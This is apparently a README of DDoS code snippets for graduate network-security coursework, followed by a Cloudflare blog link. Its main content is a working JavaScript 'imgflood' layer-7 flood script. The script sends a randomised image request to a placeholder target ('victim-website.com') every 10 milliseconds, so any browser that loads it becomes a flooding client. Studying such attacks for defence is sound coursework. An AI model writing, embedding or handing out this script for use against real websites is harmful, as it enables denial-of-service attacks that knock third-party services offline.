# DDoS
Snippets of code and resources related to DDoS attacks for graduate coursework on network security

## imgflood Layer 7 Attack
```
function imgflood() {
  var TARGET = 'victim-website.com'
  var URI = '/index.php?'
  var pic = new Image()
  var rand = Math.floor(Math.random() * 1000)
  pic.src = 'http://'+TARGET+URI+rand+'=val'
}
setInterval(imgflood, 10)
```
Resources: [An introduction to JavaScript-based DDoS](https://blog.cloudflare.com/an-introduction-to-javascript-based-ddos/)